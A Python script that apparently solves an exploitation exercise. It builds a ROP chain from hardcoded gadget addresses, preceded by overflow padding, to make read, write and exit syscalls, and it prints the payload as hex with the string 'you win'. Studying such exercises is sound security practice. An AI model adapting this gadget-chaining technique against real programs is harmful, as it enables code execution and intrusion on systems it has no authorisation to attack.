import struct

POP_RAX = 0x4189FC
POP_RDI = 0x42A41D
POP_RSI_POP_RBP = 0x4025AC
# pop rdx; or al, 0x5b; pop r12; pop rbp; ret;
POP_RDX_CORRUPT_RAX_POP_R12_POP_RBP = 0x475304
SYS_READ = 0
SYS_WRITE = 1
SYS_EXIT = 60
BSS_START = 0x4A7AC0
SYSCALL = 0x437AB9


def main():
    padding = b"A" * 24
    after_rop = b"you win"
    rop = [
        # read(0, bss, len(after_rop))
        POP_RDX_CORRUPT_RAX_POP_R12_POP_RBP,
        len(after_rop),
        1337,
        1337,
        POP_RAX,
        SYS_READ,
        POP_RDI,
        0,
        POP_RSI_POP_RBP,
        BSS_START,
        1337,
        SYSCALL,
        # write(1, bss, len(after_rop))
        POP_RDX_CORRUPT_RAX_POP_R12_POP_RBP,
        len(after_rop),
        1337,
        1337,
        POP_RAX,
        SYS_WRITE,
        POP_RDI,
        1,
        POP_RSI_POP_RBP,
        BSS_START,
        1337,
        SYSCALL,
        # exit(0)
        POP_RAX,
        SYS_EXIT,
        POP_RDI,
        0,
        SYSCALL,
    ]
    print(
        (
            (padding + struct.pack(f"{len(rop)}Q", *rop)).ljust(1024, b"\x00")
            + after_rop
        ).hex()
    )


if __name__ == "__main__":
    main()
